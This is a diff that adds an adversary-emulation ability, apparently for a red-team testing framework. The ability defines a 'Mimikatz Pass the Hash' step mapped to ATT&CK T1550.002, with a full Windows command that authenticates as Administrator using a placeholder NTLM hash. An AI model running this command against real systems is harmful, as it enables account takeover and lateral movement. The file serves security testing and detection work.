@@ -1,0 +1,18 @@
+- description: 'Note: must dump hashes first
+
+    [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
+
+    '
+  id: fc39013a41e38e52e7d14280911ff042
+  name: Mimikatz Pass the Hash
+  platforms:
+    windows:
+      cmd:
+        cleanup: ''
+        command: '%tmp%\mimikatz\x64\mimikatz.exe sekurlsa::pth /user:Administrator
+          /domain:atomic.local /ntlm:cc36cf7a8514893efccd3324464tkg1a'
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1550.002
+    name: 'Use Alternate Authentication Material: Pass the Hash'
